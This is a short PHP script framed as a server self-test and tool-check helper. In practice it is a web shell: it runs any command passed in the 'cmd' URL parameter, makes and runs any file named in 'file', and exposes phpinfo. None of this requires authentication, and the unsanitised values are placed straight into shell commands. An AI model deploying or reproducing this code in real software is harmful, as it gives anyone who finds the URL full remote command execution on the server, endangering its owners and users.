<?php
if(isset($_GET['self_test']))
{
    echo shell_exec('echo ok');
    die();
}
if(isset($_GET['phpinfo']))
{
    phpinfo();
    die();
}

function test_command($command)
{
    $output = shell_exec("which $command");
    if(!empty($output))
        echo "$command ok";
    die();
}
if(isset($_GET['test_mysql']))
    test_command('mysql');
if(isset($_GET['test_tar']))
    test_command('tar');

$command = @$_GET['cmd'];
$file = @$_GET['file'];
if(!empty($file))
{
    //make sure we have the right to execute this file. this also will fail if we don't own it.
    exec("chmod a+x $file 2>&1", $output_array, $return_value);
    if($return_value !== 0)
    {
        echo "chmod a+rx $file returned with status code $return_value\n";
        //http_response_header(500);
    }
    $command = $file;
}

if(!empty($command))
{
    exec("cd .. && $command 2>&1", $output_array, $return_value);
    if($return_value !== 0)
    {
        echo "$command returned with status code $return_value\n";
        //http_response_header(500);
    }
    echo implode("\n", $output_array);
}
